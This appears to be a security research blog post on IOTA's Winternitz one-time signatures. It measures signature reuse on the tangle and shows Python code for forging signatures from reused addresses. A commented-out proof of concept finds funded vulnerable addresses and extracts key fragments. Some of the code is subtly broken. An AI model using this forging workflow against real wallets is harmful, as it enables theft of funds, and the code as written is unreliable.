---
title: "IOTA Multisignature Problem"
description: "An analysis of using One-Time signature schemes in Cryptocurrencies"
---


# IOTAs Multisig Problem
IOTA is a post quantum secure crypto currency that gained some value in the past.
It is based on the Winternitz One Time Signature Scheme.
In contrast to RSA, DSA and ECDSA it is not based on computation in a group and cannot be broken by discrete log or factorization.
Instead it is based on hash functions and secure as long as the hash function is preimage resistant.

As usual in cryptocurrencies, the public key is used for reception of funds.
If the user wants to send some funds to a different address, she has to sign a transaction (bundle in case of IOTA)  using the private key that belongs to that public key.
As the Winternitz signature scheme is a one time signature scheme there are some problems in practice.
The main implication is that if a transaction is made once, using a secret key, this key is burned and should NOT be used anymore.
Therefore the reception address has to be changed if the user issues a transaction for that public key.
Any further transaction to that public key would cause multiple signatures, what could cause security issues.
It would be plausible if a user does not always notifies everyone, if she makes a transaction and a new public key has to be used.
Therefore multiple signatures could occur for a given address.

# Winternitz
To explain how Winternitz Sigatures works, lets first see how the signature for a single byte works (lets assume we have usual 8-bit byte for simplicity).
A random variable $x_i$ is chosen and stored as the secret key which in case of IOTA is derived from the secret seed.
Let $h$ be the hash function and $pk_i$ the public key:

$$ pk_i = h^{256}(x_i) = h(h(h( ... h(x_i)))) $$

To sign a byte $b_i$ we have to publish:

$$ sig_i = h^{256-b_i}(x_i) $$

And the sigature can be verified by testing if

$$ pk_i = h^{b_i}(sig_i) $$

This scheme can adopted for multi byte signatures by choosing a different $x_i$ for every byte $b_i$.
Of course this basic method is not secure at all, as an attacker can sign all bytes $b'_i < b_i$.
The way IOTA handles this problem is to normalize the bytestring $B = (b_0, b_1, ... b_n)$ by changing the first bytes such that:

$$ \sum_i b_i = 128 $$

As IOTA uses trytes and not bytes this is slightly different in that case.
If an attacker wants to sign a different bytestring, she has to choose a different bytestring $B' \not= B$.
As the total sum is constant there will be at least two bytes such that $b'_i < b_i$ and $b'_j > b_j$.
To sign this bytestring $B'$ using a different signature, the attacker has to compute a preimage for $b'_j$ what is not possible in practice.
Even though this assumption only holds if the public key is only used once.

IOTA uses trits (-1,0,1) and trytes (group of 3 trits, 9,A-Z) to represent hash values.
Depending on the security level of the wallet a signature a signature consists of 1-3 fragments.
Each signature fragment itself consists of 27 Winternitz signatures.
Let $ pk_{i,j} $ be the $i$-th Winternitz public key of fragment $j$.
The IOTA public key (address) for a security level of 2 is computed as:

$$ addr = h(h(pk_{0,0} || pk_{1,0} || ... || pk_{26,0}) || h(pk_{0,1} || pk_{1,1} || ... || pk_{26,1})) $$


# Analyzing the Tangle
There exists a repository [alon-e/iotaWayBack](https://github.com/alon-e/iotaWayBack.git) that can be used to download and analyze the tangle.
All transactions can then be stored in a SQL database, but the whole process takes several hours to complete.
The most relevant fields are:

    -signature_message_fragment: Signature fragment of a bundle. Usually split over two entries (depending on security level).
    -address: The address that issues the transaction.
    -bundle_hash: The hash of the signed bundle.

This database can then be used to search for addresses that signed multiple bundles.
I've analyzed transactions of 27682 addresses (24.10.2016-10.12.2017) and 1425 have submitted multiple signatures!

| Signatures | Found | Affected MIOTA |
|------------|-------|----------------|
| 2          | 1313  | 925.682126     |
| 3          | 73    | 0.0037         |
| 4          | 24    | 1.279097       |
| 5          | 8     | ~0             |
| 6          | 2     | ~0             |
| 7          | 2     | ~0             |

# Forging Signatures
Luckily IOTA ships with an open source python implementation.
The iota.crypto.signing.validate_signature_fragments(...) can be used to check signatures in the tangle.
The pseudo code looks as follows (taken from iota.lib.py/iota/crypto/signing.py):

```python
def get_sk_fragments(fragments, bundle_hash, public_key):
  normalized_hash = normalize(bundle_hash)

  for (i, fragment) in enumerate(fragments): # for all signature fragments
    normalized_chunk = normalized_hash[i % len(normalized_hash)]

    outer = []
    sk_fragments[i*27 + j][normalized_chunk[j]] = buffer
    for (j, hash_trytes) in enumerate(fragment.iter_chunks(Hash.LEN)): # for each tryte in fragment
      buffer = hash_trytes.as_trits()

      for i in range(13 + normalized_chunk[j]): # winternitz iteration
        buffer = h(buffer)
        sk_fragments[i*27 + j][normalized_chunk[j]-i-1] = buffer

      outer.append(buffer)
    checksum.append( h(outer))


  return  h(checksum) == public_key.as_trits()
```

Note that there is a small modification, the update of sk_fragments, which keeps track of the intermediate values of the Winternitz values.
Using the known values of two or more signatures, own signatures can be forged.
If a particular intermediate value is not known, an IndexError is thrown and the signature generation fails.

```python
def sign(forged_hash, sk_fragments, num_frags = 2):
    normalized_hash = normalize(forged_hash)

    fragments = []
    for i in range(num_frags):
      fragment = ""
      for j in range(len(normalized_hash[i])):
          x = normalized_hash[i][j]
          x = sk_fragments[str(i*27 + j)][str(x)]
          fragment += str(iota.TryteString.from_trits(x))

      fragments += [iota.TryteString(fragment)]

    return fragments
```

In the IOTA protocol the bundle hash is a hash value of a bundle, an actual money movement and can not be chosen arbitrarily.
Even though random values can be signed if only two signatures are known.
This can be achieved by slightly mutating a known signature.

```python
import random
def mutate(x, n=26):
    x = x.as_trits()
    for _ in range(n):
        i = random.randrange(len(x))
        x[i] = x[i] * random.randrange(-1,2)

    return TryteString.from_trits(x)
```

# Estimating Bit Security
To estimate the bit security I made one assumption, that the signed hash is purely random.
Of course as the hash is normalized this is not true in practice.
Let $b'_i$ be the forged and $b^j_i$ the legitimate signature and assume that the propability of finding a signature is:

$$ P = \prod_i P(b'_i > Max_j(b^j_i)) $$

I've written a small program to verify the estimation and they seem to be a little bit off.
The actual number of attempts strongly depends on the signatures, how many hash values are revealed.
A rough estimation is

| Num Sigs | Estimated Bit Security |
|----------|------------------------|
| 2        | ~50 bit                |
| 3        | ~30 bit                |

<!--
# PoC
The repository  [bolek42/iotaWayBack](https://github.com/bolek42/iotaWayBack.git) implements a basic PoC for the problems above.
After using traverse.py to download the tangle parse_and_store.py can be used to export the transactions to a sqlite database.
The whole process can take several hours to complete.

```
python find_multisig.py sqlalchemy_IRI.db
```

can be used to find IOTA addresses that issued multiple signatures and still contain IOTA.
The key fragments will be written in a json file in keys/[address].json.
For each found address the balance and estimated bit security is printed.


The following call can be used to create valid signatures for a mutated bundle hash

```
python sigforge.py address bundle_hash
```

To create signatures of random variables to show the feasibility of signature forging the bundle hash can be omitted.
Note that this implementation is single threaded and not tuned for performance.

```
python sigforge.py address
```

-->
